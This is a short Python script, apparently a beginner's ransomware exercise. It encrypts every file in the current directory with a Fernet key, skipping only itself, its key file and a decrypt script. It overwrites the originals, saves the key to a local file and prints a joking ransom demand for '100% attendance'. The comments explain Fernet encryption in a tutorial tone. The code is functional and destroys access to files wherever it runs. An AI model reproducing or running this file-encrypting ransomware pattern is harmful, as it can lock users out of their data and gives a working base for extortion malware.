import os
from cryptography.fernet import Fernet # from encryption one library we imported fernet, basically fernet is a symmetric encryption method which makes sure that the message encrypted cannot be manipulated or read without the key.It uses URL safe encoding for the keys.Fernet also uses 128-bit AES

files = []
for file in os.listdir():
	if file == "encrypt.py" or file == "thekey.key" or file == "decrypt.py":
		continue
	if os.path.isfile(file):
		files.append(file)   #because it can add directories as well so we want to prevent adding any directory as we want to only encrypt our files



key = Fernet.generate_key()
with open("thekey.key","wb") as thekey:
	thekey.write(key)

for file in files:
	with open(file,"rb") as thefile:
		contents = thefile.read()
	contents_encrypted = Fernet(key).encrypt(contents)
	with open(file,"wb") as thefile:
		thefile.write(contents_encrypted)   #basically this will open each file, encrypt it and then write it back to the file as an encrypted file


print("Okay so all of your files are now in my control. Provide me with 100% attendance else forget those files ;)")
